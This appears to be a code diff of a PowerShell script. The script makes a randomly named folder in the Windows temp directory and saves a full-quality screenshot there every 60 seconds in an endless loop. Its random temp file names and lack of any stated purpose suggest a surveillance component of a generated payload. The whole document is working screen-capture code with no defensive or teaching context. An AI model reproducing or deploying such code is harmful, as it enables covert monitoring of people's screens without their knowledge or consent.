@@ -1,8 +1,9 @@
-$proc = Get-process | Where-Object {$_.path -eq "$env:temp/SbQRViPjIq.ps1"}
-[Microsoft.VisualBasic.Interaction]::AppActivate($Proc.id)
 [void] [System.Reflection.Assembly]::LoadWithPartialName("System.Drawing") 
 [void] [System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms")
 
+$path = "$env:temp/amETlOMhPo"
+mkdir $path
+Set-Location $path
 function Get-ScreenCapture
 {
     param(    
@@ -26,17 +27,18 @@ function Get-ScreenCapture
         $bitmap = [Windows.Forms.Clipboard]::GetImage()    
         $ep = New-Object Drawing.Imaging.EncoderParameters  
         $ep.Param[0] = New-Object Drawing.Imaging.EncoderParameter ([System.Drawing.Imaging.Encoder]::Quality, [long]100)  
-        $screenCapturePathBase = "cqTbMpzNLx"
+        $screenCapturePathBase = "$path\cqTbMpzNLx"
         $c = 0
-        while (Test-Path "${c}${screenCapturePathBase}.jpg") {
+        while (Test-Path "${screenCapturePathBase}${c}.jpg") {
             $c++
         }
-        $bitmap.Save("${c}cqTbMpzNLx.jpg", $jpegCodec, $ep)
+        $bitmap.Save("${screenCapturePathBase}${c}.jpg", $jpegCodec, $ep)
     }
 
 }
 
 while ($true) {
     Get-ScreenCapture
+    echo "pic taken"
     Start-Sleep -Seconds 60
 }
